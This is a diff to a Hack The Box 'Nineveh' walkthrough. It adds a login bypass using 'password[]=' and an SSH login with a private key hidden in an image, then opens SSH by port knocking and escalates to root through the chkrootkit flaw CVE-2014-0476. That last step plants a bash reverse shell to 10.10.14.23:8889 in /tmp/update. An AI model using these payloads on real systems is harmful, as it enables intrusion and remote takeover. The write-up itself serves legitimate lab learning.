@@ -296,6 +296,18 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-01 12:41:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-01 12:42:15
 ```
 
+Note to self: 
+
+submitting the form from Firefox, Burp shows the POST data as:
+
+username=admin&password=admin
+
+If changed this to:
+
+username=admin&password[]=
+
+It works as well
+
 ### phpLiteAdmin code injection
 
 Login to the admin portal. Create a database called ninevehNotes.txt.php that gets created in directory /var/tmp/ninevehNotes.txt.php (remember to switch to the new table from the menu).
@@ -393,7 +405,7 @@ $
 
 This seems to crash the kernel, back to basics.
 
-### SSH with a private key
+### www-data to amrois: SSH with a private key
 
 An image in directory /var/www/ssl/secure_notes sounds like checking. tail nineveh.png reveals there is a private key hidden in it.
 
@@ -446,19 +458,187 @@ fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
 -----END RSA PRIVATE KEY-----
 ```
 
+As the ssh port is not open to our attacking host, we need to execute the commands on the target host. First create a file with the private key.
+
+```
+ww-data@nineveh:/tmp$ chmod 600 key.txt
+chmod 600 key.txt
+www-data@nineveh:/tmp$ ssh -i key.txt amrois@localhost
+ssh -i key.txt amrois@localhost
+Could not create directory '/var/www/.ssh'.
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:aWXPsULnr55BcRUl/zX0n4gfJy5fg29KkuvnADFyMvk.
+Are you sure you want to continue connecting (yes/no)? yes
+yes
+Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
+Ubuntu 16.04.2 LTS
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+288 packages can be updated.
+207 updates are security updates.
 
 
+You have mail.
+Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
+amrois@nineveh:~$ ls -al /home/amrois/user.txt
+ls -al /home/amrois/user.txt
+-rw------- 1 amrois amrois 33 Jan  2 03:14 /home/amrois/user.txt
+amrois@nineveh:~$ 
+```
+
+### www-data to amrois: knockd
+
+From the process list we can detect knockd that is an interesting one
+
+```
+amrois@nineveh:~$ ps auxww | grep knockd
+ps auxww | grep knockd
+root      1312  1.0  0.2   8756  2224 ?        Ss   03:13   0:14 /usr/sbin/knockd -d -i ens160
+amrois   22767  0.0  0.0  14228   968 pts/1    S+   03:35   0:00 grep --color=auto knockd
+amrois@nineveh:~$
+```
+
+knockd is a daemon for port knocking, which will set certain firewall rules when certain ports are hit in order. 
+
+We need to know the configuration to check sequences do what.
+
+```
+amrois@nineveh:~$ cat /etc/knockd.conf
+cat /etc/knockd.conf
+[options]
+ logfile = /var/log/knockd.log
+ interface = ens160
+
+[openSSH]
+ sequence = 571, 290, 911 
+ seq_timeout = 5
+ start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+ tcpflags = syn
+
+[closeSSH]
+ sequence = 911,290,571
+ seq_timeout = 5
+ start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+ tcpflags = syn
+amrois@nineveh:~$
+```
+
+It opens the SSH-port, and we already have an ssh access locally. But for the sake of practice we shall open the port.
+
+```
+$ for i in 571 290 911; do nmap -Pn --host-timeout 100 --max-retries 0 -p $i 10.129.177.167 >/dev/null; done; ssh -i nineveh_key.txt amrois@10.129.177.167                                                   130 ⨯
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+The authenticity of host '10.129.177.167 (10.129.177.167)' can't be established.
+ECDSA key fingerprint is SHA256:aWXPsULnr55BcRUl/zX0n4gfJy5fg29KkuvnADFyMvk.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.177.167' (ECDSA) to the list of known hosts.
+Ubuntu 16.04.2 LTS
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+288 packages can be updated.
+207 updates are security updates.
 
 
+You have mail.
+Last login: Sun Jan  2 03:28:13 2022 from 127.0.0.1
+amrois@nineveh:~$
+```
 
-Note to self: 
+### amrois to root: chkrootkit vulnerability CVE-2014-0476
 
-submitting the form from Firefox, Burp shows the POST data as:
+Checking the usual suspects something worth looking into is found from crontab
 
-username=admin&password=admin
+```
+amrois@nineveh:~$ crontab -l
+# Edit this file to introduce tasks to be run by cron.
+# 
+# Each task to run has to be defined through a single line
+# indicating with different fields when the task will be run
+# and what command to run for the task
+# 
+# To define the time you can provide concrete values for
+# minute (m), hour (h), day of month (dom), month (mon),
+# and day of week (dow) or use '*' in these fields (for 'any').# 
+# Notice that tasks will be started based on the cron's system
+# daemon's notion of time and timezones.
+# 
+# Output of the crontab jobs (including errors) is sent through
+# email to the user the crontab file belongs to (unless redirected).
+# 
+# For example, you can run a backup of all your user accounts
+# at 5 a.m every week with:
+# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
+# 
+# For more information see the manual pages of crontab(5) and cron(8)
+# 
+# m h  dom mon dow   command
+*/10 * * * * /usr/sbin/report-reset.sh
 
-If changed this to:
+amrois@nineveh:~$ cat /usr/sbin/report-reset.sh
+#!/bin/bash
 
-username=admin&password[]=
+rm -rf /report/*.txt
+amrois@nineveh:~$ ls -al /report
+total 72
+drwxr-xr-x  2 amrois amrois 4096 Jan  2 03:57 .
+drwxr-xr-x 24 root   root   4096 Jan 29  2021 ..
+-rw-r--r--  1 amrois amrois 4845 Jan  2 03:50 report-22-01-02:03:50.txt
+-rw-r--r--  1 amrois amrois 4845 Jan  2 03:51 report-22-01-02:03:51.txt
+-rw-r--r--  1 amrois amrois 4845 Jan  2 03:52 report-22-01-02:03:52.txt
+-rw-r--r--  1 amrois amrois 4845 Jan  2 03:53 report-22-01-02:03:53.txt
+-rw-r--r--  1 amrois amrois 4845 Jan  2 03:54 report-22-01-02:03:54.txt
+-rw-r--r--  1 amrois amrois 4845 Jan  2 03:55 report-22-01-02:03:55.txt
+-rw-r--r--  1 amrois amrois 4845 Jan  2 03:56 report-22-01-02:03:56.txt
+-rw-r--r--  1 amrois amrois 4845 Jan  2 03:57 report-22-01-02:03:57.txt
+amrois@nineveh:~
+```
 
-It let’s me in
+Clearly there is something that creates a report once a minute, and a cronjob cleans them up.
+
+The report is looking for suspicious files, and contains for example
+
+```
+...
+Searching for Suckit rootkit... Warning: /sbin/init INFECTED
+...
+Searching for suspect PHP files... 
+/tmp/ninevehNotes.txt.php
+/var/tmp/ninevehNotes.txt.php
+...
+```
+
+So we have a rootkit scanner here. Checking processes using 'top' reveals chkrootkit running.
+
+Simple one to exploit, create a file /tmp/update with a reverse shell and make it executable. Next time chkrootkit runs it contacts our listener.
+
+```
+amrois@nineveh:~$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.23/8889 0>&1' > /tmp/update && chmod +x /tmp/update
+amrois@nineveh:~$
+```
+
+Next time chkrootkit runs it contacts our listener
+
+```
+$ nc -nvlp 8889
+listening on [any] 8889 ...
+connect to [10.10.14.23] from (UNKNOWN) [10.129.177.167] 45998
+bash: cannot set terminal process group (4292): Inappropriate ioctl for device
+bash: no job control in this shell
+root@nineveh:~# whoami
+whoami
+root
+root@nineveh:~# ls -al /root/root.txt
+ls -al /root/root.txt
+-rw------- 1 root root 33 Jan  2 03:14 /root/root.txt
+root@nineveh:~# 
+```
